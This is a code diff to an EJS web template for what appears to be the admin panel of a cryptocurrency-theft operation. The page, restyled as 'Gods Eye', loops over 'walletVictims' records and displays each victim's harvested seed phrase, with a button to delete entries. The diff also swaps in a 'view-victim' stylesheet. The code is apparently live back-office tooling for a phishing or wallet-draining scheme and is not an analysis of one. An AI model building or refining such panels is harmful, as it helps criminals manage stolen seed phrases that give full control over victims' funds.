@@ -5,21 +5,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wallet View</title>
-    <link rel="stylesheet" href="/css/wallet-view.css">
+    <link rel="icon" href="/uploads/vavicon 2.png" type="image/x-icon">
+    <link rel="stylesheet" href="/css/view-victim.css">
 </head>
 
 <body>
 
-    <h2>Wallet View</h2>
-    <a href="/dashboard" class="back-to-dashboard">Back to Dashboard</a>
-    <ul>
-        <% if (walletVictims && walletVictims.length > 0) { %>
-            <% walletVictims.forEach(wallet => { %>
-                <li>
-                    <div class="details">
-                        <strong>User ID: <p><%= wallet.userId %></p></strong>
-                        <strong>Seed Phrase: <p><%= wallet.seedPhrase.join(', ') %></p></strong>
-                        <strong>Date: <p><%= wallet.date.toLocaleString() %></p></strong>
+
+    <div class="gods-eye">
+
+        <h2>Gods Eye <i class="fa-solid fa-eye blinking-eye"></i></h2>
+
+        <a href="/dashboard" class="back-to-dashboard">Back to Dashboard</a>
+        <ul>
+            <% if (walletVictims && walletVictims.length> 0) { %>
+                <% walletVictims.forEach(wallet=> { %>
+                    <li class="mua">
+                        <div class="details">
+                            <strong>Seed Phrase: <p>
+                                    <%= wallet.seedPhrase.join(', ') %></p></strong>
                     </div>
     
                     <form action="/delete-wallet/<%= wallet._id %>" method="POST" style="display:inline;">
@@ -31,7 +35,10 @@
             <p>No wallet data found.</p>
         <% } %>
     </ul>
-    
+    </div>
+
+
+    <script src="https://kit.fontawesome.com/b3fa93e021.js" crossorigin="anonymous"></script>
 
 </body>
 
